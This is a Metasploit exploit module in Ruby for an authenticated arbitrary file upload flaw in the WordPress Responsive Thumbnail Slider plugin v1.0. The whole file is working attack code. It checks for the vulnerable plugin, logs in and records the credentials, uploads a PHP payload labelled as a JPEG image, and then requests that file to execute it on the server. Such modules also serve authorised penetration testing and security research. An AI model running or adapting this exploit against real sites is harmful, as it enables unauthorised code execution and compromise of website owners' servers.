##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::PhpEXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "WordPress Responsive Thumbnail Slider Arbitrary File Upload",
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability in Responsive Thumbnail Slider
        Plugin v1.0 for WordPress post authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Arash Khazaei', # EDB PoC
          'Shelby Pace'    # Metasploit Module
        ],
      'References'     =>
        [
          [ 'EDB', '37998' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Responsive Thumbnail Slider Plugin v1.0', { } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Aug 28 2015",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base path for WordPress", '/' ]),
        OptString.new('WPUSERNAME', [ true, "WordPress Username to authenticate with", 'admin' ]),
        OptString.new('WPPASSWORD', [ true, "WordPress Password to authenticate with", '' ])
      ])
  end

  def check
    # The version regex found in extract_and_check_version does not work for this plugin's
    # readme.txt, so we build a custom one.
    check_code = check_version || check_plugin_path
    if check_code
      return check_code
    else
      return CheckCode::Safe
    end
  end

  def check_version
    plugin_uri = normalize_uri(target_uri.path, '/wp-content/plugins/wp-responsive-thumbnail-slider/readme.txt')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  plugin_uri
    )

    if res && res.body && res.body =~ /Version:([\d\.]+)/
      version = Gem::Version.new($1)
      if version <= Gem::Version.new('1.0')
        vprint_status("Plugin version found: #{version}")
        return CheckCode::Appears
      end
    end

    nil
  end

  def check_plugin_path
    plugin_uri = normalize_uri(target_uri.path, '/wp-content/uploads/wp-responsive-images-thumbnail-slider/')

    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  plugin_uri
    )

    if res && res.code == 200
      vprint_status('Upload folder for wp-responsive-images-thumbnail-slider detected')
      return CheckCode::Detected
    end

    nil
  end

  def login
    auth_cookies = wordpress_login(datastore['WPUSERNAME'], datastore['WPPASSWORD'])
    return fail_with(Failure::NoAccess, "Unable to log into WordPress") unless auth_cookies

    store_valid_credential(user: datastore['WPUSERNAME'], private: datastore['WPPASSWORD'], proof: auth_cookies)

    print_good("Logged into WordPress with #{datastore['WPUSERNAME']}:#{datastore['WPPASSWORD']}")
    auth_cookies
  end

  def upload_payload(cookies)
    manage_uri = 'wp-admin/admin.php?page=responsive_thumbnail_slider_image_management'
    file_payload = get_write_exec_payload(:unlink_self => true)
    file_name = "#{rand_text_alpha(5)}.php"

    # attempt to access plugins page
    plugin_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(target_uri.path, manage_uri),
      'cookie'  =>  cookies
    )

    unless plugin_res && plugin_res.body.include?("tmpl-uploader-window")
      fail_with(Failure::NoAccess, "Unable to reach Responsive Thumbnail Slider Plugin Page")
    end

    data = Rex::MIME::Message.new
    data.add_part(file_payload, 'image/jpeg', nil, "form-data; name=\"image_name\"; filename=\"#{file_name}\"")
    data.add_part(file_name.split('.')[0], nil, nil, "form-data; name=\"imagetitle\"")
    data.add_part('Save Changes', nil, nil, "form-data; name=\"btnsave\"")
    post_data = data.to_s

    # upload the file
    upload_res = send_request_cgi(
      'method'  =>  'POST',
      'uri'     =>  normalize_uri(target_uri.path, manage_uri, '&action=addedit'),
      'cookie'  =>  cookies,
      'ctype'   =>  "multipart/form-data; boundary=#{data.bound}",
      'data'    =>  post_data
    )

    page = send_request_cgi('method' => 'GET', 'uri' => normalize_uri(target_uri.path, manage_uri), 'cookie' => cookies)
    fail_with(Failure::Unknown, "Unsure of successful upload") unless (upload_res && page && page.body =~ /New\s+image\s+added\s+successfully/)

    retrieve_file(page, cookies)
  end

  def retrieve_file(res, cookies)
    fname = res.body.scan(/slider\/(.*\.php)/).flatten[0]
    fail_with(Failure::BadConfig, "Couldn't find file name") if fname.empty? || fname.nil?
    file_uri = normalize_uri(target_uri.path, "wp-content/uploads/wp-responsive-images-thumbnail-slider/#{fname}")

    print_good("Successful upload")
    send_request_cgi(
      'uri' => file_uri,
      'method' => 'GET',
      'cookie' => cookies
    )
  end

  def exploit
   unless check == CheckCode::Safe
     auth_cookies = login
     upload_payload(auth_cookies)
   end
  end
end
